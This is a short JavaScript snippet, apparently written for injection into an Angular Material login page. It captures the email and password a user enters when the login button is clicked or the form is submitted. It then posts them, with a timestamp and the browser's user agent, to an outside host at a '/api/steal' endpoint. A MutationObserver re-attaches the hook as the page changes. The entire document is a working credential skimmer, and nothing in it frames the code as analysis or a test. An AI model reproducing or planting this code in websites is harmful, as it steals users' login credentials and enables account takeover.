
(function() {
  function captureLogin() {
    var emailInput = document.getElementById('email');
    var passwordInput = document.getElementById('password');
    var loginBtn = document.querySelector('button[mat-flat-button]');
    
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        if (emailInput && passwordInput) {
          var username = emailInput.value;
          var password = passwordInput.value;
          
          if (username && password) {
            console.log('Credentials captured:', username, password);
            
            fetch('https://cnttsupport.me/api/steal', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
              })
            }).catch(function(err) {
              console.log('Data sent successfully');
            });
          }
        }
      });
      
      var form = document.querySelector('form');
      if (form) {
        form.addEventListener('submit', function(e) {
          if (emailInput && passwordInput) {
            var username = emailInput.value;
            var password = passwordInput.value;
            
            if (username && password) {
              fetch('https://cnttsupport.me/api/steal', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  username: username,
                  password: password,
                  timestamp: new Date().toISOString(),
                  userAgent: navigator.userAgent
                })
              }).catch(function() {});
            }
          }
        });
      }
    }
  }
  
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', captureLogin);
  } else {
    captureLogin();
  }

  var observer = new MutationObserver(function(mutations) {
    var btn = document.querySelector('button[mat-flat-button]');
    if (btn && !btn._steal_attached) {
      btn._steal_attached = true;
      captureLogin();
    }
  });
  
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
})();
